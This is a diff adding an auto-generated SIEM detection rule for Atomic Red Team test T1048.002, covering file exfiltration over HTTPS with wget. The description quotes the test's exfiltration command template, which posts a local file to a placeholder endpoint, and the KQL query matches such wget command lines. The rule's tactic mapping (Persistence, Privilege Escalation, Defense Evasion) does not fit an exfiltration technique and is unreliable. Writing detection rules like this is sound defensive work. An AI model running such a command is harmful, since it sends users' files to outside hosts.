@@ -1,0 +1,39 @@
+[rule]
+author = [ "AtomicRedTeam-Automation",]
+description = "Detection for specific test 'Exfiltrate data in a file over HTTPS using wget' (GUID: 7ccdfcfa-6707-46bc-b812-007ab6ff951c) of technique T1048.002 (Exfiltration Over Alternative Protocol - Exfiltration Over Asymmetric Encrypted Non-C2 Protocol). Test Description: Exfiltrate data over HTTPS using wget --post-file method. Command/Steps: wget --post-file=\\\"#{input_file}\\\" --timeout=5 --no-check-certificate #{endpoint_domain} --delete-after\n"
+from = "now-9m"
+rule_id = "071d3c37-e323-4296-92e0-16332b0ce960"
+language = "kql"
+name = "Atomic Test: T1048.002 - Exfiltrate data in a file over HTTPS using wget"
+output_index = ".siem-signals-default"
+references = [ "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/refs/heads/master/atomics/T1048.002/T1048.002.yaml",]
+risk_score = 50
+severity = "medium"
+tags = [ "AtomicRedTeam", "T1048.002", "7ccdfcfa-6707-46bc-b812-007ab6ff951c", "linux",]
+type = "query"
+query = "(process.name : (\\\"sh\\\", \\\"bash\\\") OR process.parent.name : (\\\"sh\\\", \\\"bash\\\")) AND process.command_line : \\\"*wget*\\\" AND process.command_line : \\\"*--timeout=5*\\\" AND process.command_line : \\\"*--no-check-certificate*\\\""
+version = 1
+index = [ "logs-endpoint.events.*", "winlogbeat-*", "logs-windows.*", "logs-linux.*", "logs-macos.*",]
+[[rule.threat]]
+framework = "MITRE ATT&CK"
+[[rule.threat.technique]]
+id = "T1048.002"
+name = "Exfiltrate data in a file over HTTPS using wget"
+reference = "https://attack.mitre.org/techniques/T1048/002"
+
+[[rule.threat.tactic]]
+id = "TA0003"
+name = "Persistence"
+reference = "https://attack.mitre.org/techniques/T1048/002"
+
+[[rule.threat.tactic]]
+id = "TA0004"
+name = "Privilege Escalation"
+reference = "https://attack.mitre.org/techniques/T1048/002"
+
+[[rule.threat.tactic]]
+id = "TA0005"
+name = "Defense Evasion"
+reference = "https://attack.mitre.org/techniques/T1048/002"
+
+
